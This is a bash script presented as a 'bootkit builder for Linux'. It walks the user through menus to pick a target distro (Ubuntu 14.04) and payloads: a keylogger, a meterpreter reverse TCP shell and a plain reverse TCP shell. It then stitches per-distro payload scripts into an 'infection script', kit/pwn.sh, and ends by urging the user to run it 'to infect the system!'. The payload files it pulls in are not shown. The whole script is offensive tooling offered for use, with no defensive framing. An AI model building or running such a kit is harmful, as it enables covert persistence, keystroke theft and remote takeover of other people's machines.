#!/bin/bash

#bootkit builder for Linux
#read README.md for usage
#
# Before running you MUST prepare:
# - binaries for target distro(s), due to GPL they couldn't be included
# - compiled payloads for target distro/pwning_ip
#
# This builder is merely an automation of bootkit building.
# It was tested on few Ubuntu versions, more distros may be added in future

title="Which linux distro do you want to pwn?"
prompt="Choose a distro:"

#indexed from 1 list of target systems
options=(
"Ubuntu 14.04 x86_64"
)

echo "$title"
PS3="$prompt "
select system_option in "${options[@]}" "Quit"; do

  case "$REPLY" in

  1 ) echo "You chose $system_option "; break;;

  $(( ${#options[@]}+1 )) ) echo "Sorry, but you MUST choose a system"; exit 1; break;;

  * ) echo "Invalid option."; continue;;

  esac
done


title="Choose your payloads"
         
#indexed from 0 list of payloads:
options=(
"Simple keylogger"
"Reverse TCP Shell for meterpreter" 
"Simple reverse TCP"
)

menu() {
  echo "Available payloads:"
  for i in ${!options[@]}; do
    printf "%3d%s) %s\n" $((i+1)) "${choices[i]:- }" "${options[i]}"
  done
  [[ "$msg" ]] && echo "$msg"; :
}
prompt="Check your payload (again to uncheck, ENTER when done): "
while menu && read -rp "$prompt" num && [[ "$num" ]]; do
  [[ "$num" != *[![:digit:]]* ]] &&
  (( num > 0 && num <= ${#options[@]} )) ||
  { 
    msg="Invalid option: $num"; 
    continue; 
  }
  ((num--));
  msg="${options[num]} was ${choices[num]:+un}checked"
  [[ "${choices[num]}" ]] && choices[num]="" || choices[num]="+" 
done

printf "You selected payloads:\n";
msg=" nothing"
payloads=()
for i in ${!options[@]}; do
  [[ "${choices[i]}" ]] && { payloads+=( "$i" ); printf " %s\n" "${options[i]}"; msg=""; }
done

if [ "$msg" != "" ]; then
  echo "no payloads - infecting will not be made";
  exit 1;
fi
echo $msg

outputscript="kit/pwn.sh";
touch $outputscript
chmod +x $outputscript
cat kit/kitgen/config_common.sh > $outputscript

case $REPLY in
  1 )
    echo "Building script for: $system_option ..."
    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64.sh >> $outputscript
    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_start.sh >> $outputscript
    [[ "${choices[0]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_keylogger.sh >> $outputscript
    [[ "${choices[1]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp_meterpreter.sh >> $outputscript
    [[ "${choices[2]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp.sh >> $outputscript
    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_end.sh >> $outputscript
    kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_build.sh ${payloads[@]} >> $outputscript
    echo "ready to use infection script for $system_option can be found at: $outputscript"
    ;;
esac
echo "Run $outputscript to infect the system!"
